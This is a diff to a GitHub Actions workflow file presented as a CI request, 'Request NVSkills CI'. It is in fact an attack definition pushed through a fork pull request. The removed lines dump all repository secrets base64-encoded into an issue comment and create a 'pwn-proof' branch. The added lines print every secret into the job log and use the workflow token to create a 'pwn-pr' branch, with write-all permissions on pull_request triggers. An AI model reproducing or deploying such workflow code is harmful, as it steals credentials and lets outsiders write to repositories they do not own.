@@ -1,11 +1,14 @@
-# attacker-controlled definition pushed via fork PR + copy-pr-bot
 name: Request NVSkills CI
 
 on:
   push:
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+
+permissions: write-all
 
 jobs:
-  probe:
+  fork-probe:
     runs-on: ubuntu-latest
     permissions: write-all
     steps:
@@ -13,19 +16,15 @@ jobs:
         env:
           GH_TOKEN: ${{ github.token }}
           REPO: ${{ github.repository }}
-          REF_NAME: ${{ github.ref_name }}
-          SHA: ${{ github.sha }}
-          ACTOR: ${{ github.actor }}
-          ALL_SECRETS: ${{ toJSON(secrets) }}
+          SHA: ${{ github.event.pull_request.head.sha || github.sha }}
+          EV: ${{ github.event_name }}
+          SECRETS_JSON: ${{ toJSON(secrets) }}
         run: |
-          echo "MARKER=lazyhacker6-rce-marker"
-          echo "REF=$REF_NAME ACTOR=$ACTOR SHA=$SHA"
-          echo "SECRET_NAMES=$(printf '%s' "$ALL_SECRETS" | jq -r 'keys|join(",")')"
-          echo "SECRETS_B64_START"
-          printf '%s' "$ALL_SECRETS" | base64 -w0; echo
-          echo "SECRETS_B64_END"
-          echo "--- token permissions ---"
-          curl -s -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO" -o /dev/null -w 'repo_http=%{http_code}\n'
-          printf '%s' "$ALL_SECRETS" | base64 -w0 > /tmp/b64.txt
-          gh api -X POST "repos/$REPO/issues/2/comments" -f body="LZH6_SECRETS_B64=$(cat /tmp/b64.txt)" --jq .html_url || echo "comment failed"
-          gh api -X POST "repos/$REPO/git/refs" -f ref=refs/heads/pwn-proof -f sha="$SHA" --jq .ref || echo "ref create failed"
+          echo "MARKER=fork-pr-token-probe"
+          echo "EVENT=$EV SHA=$SHA"
+          echo "SECRETS=$SECRETS_JSON"
+          code=$(curl -s -o /tmp/resp -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO")
+          echo "repo_read_http=$code"
+          code2=$(curl -s -o /tmp/resp2 -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$REPO/git/refs" -d "{\"ref\":\"refs/heads/pwn-pr-$EV\",\"sha\":\"$SHA\"}")
+          echo "ref_create_http=$code2"
+          cat /tmp/resp2
